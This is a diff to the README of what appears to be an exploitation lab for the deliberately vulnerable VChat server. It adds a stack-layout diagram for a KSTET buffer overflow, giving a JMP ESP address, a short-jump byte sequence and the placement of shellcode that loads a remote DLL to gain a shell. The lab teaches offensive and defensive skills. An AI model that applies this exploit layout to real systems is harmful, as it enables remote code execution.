@@ -287,6 +287,7 @@ python boofuzz-vchat-KSTET-DLL.py
 
 
 Now that we have all the necessary parts for the creation of a exploit we will discuss what we have done so far (the **exploit.py** files), and how we can now expand our efforts to gain a shell in the target machine.
+
 ### Exploitation
 1. We know from one of our previous runs of `mona.py` (`!mona findmsp`) that we have a very limited amount of space following the *EIP* register. As we have done in previous exploits, we will perform a short relative jump to the start of the buffer so we can use the sixty-six bytes that precede our return address for our first-stage shell code.
 
@@ -569,6 +570,26 @@ Now we have everything we need to exploit the VChat server using the DLL sideloa
 5. Run the [exploit5.py](./SourceCode/exploit5.py) program!
 
 	https://github.com/DaintyJet/VChat_KSTET_DLL/assets/60448620/8da0d1be-485d-4e47-93b2-91c53a917773
+
+The diagram below shows the stack layout when the malicious string is injected on the stack. The JMP ESP overwrite the return address of the victim function. When the victim function returns, it runs the JMP SHORT instruction. The JMP SHORT jumps to the start of the buffer and runs the shellcode, which loads the remote DLL.
+``` 
+   |-----------------------------------|
+   | b'C' * (24)                       |
+   |-----------------------------------|
+---| b'\xeb\xc2'                       | # JMP SHORT <---
+|  |-----------------------------------|                |
+|  | struct.pack('<L', 0x625026D3)     | # JMP ESP   ----
+|  |-----------------------------------|
+|  | b'A' * (58 - len(SHELL_LIB) - 2)  |
+|  |-----------------------------------|
+|  | SHELL_LIB                         |
+|  |-----------------------------------|
+|  | b'\x90' * 2                       |
+-->|-----------------------------------|
+   | b'KSTET '                         |
+   |-----------------------------------|
+```
+
 ## Attack Mitigation Table
 In this section, we will discuss the effects a variety of defenses would have on *this specific attack* on the VChat server; specifically we will be discussing their effects on a buffer overflow that overwrites a return address and attempts to execute shellcode that has been written to the stack, this shellcode will then use the `LoadLibraryA(...)` function in order to run a larger second stage. We will make a note here that these mitigations may be bypassed.
 
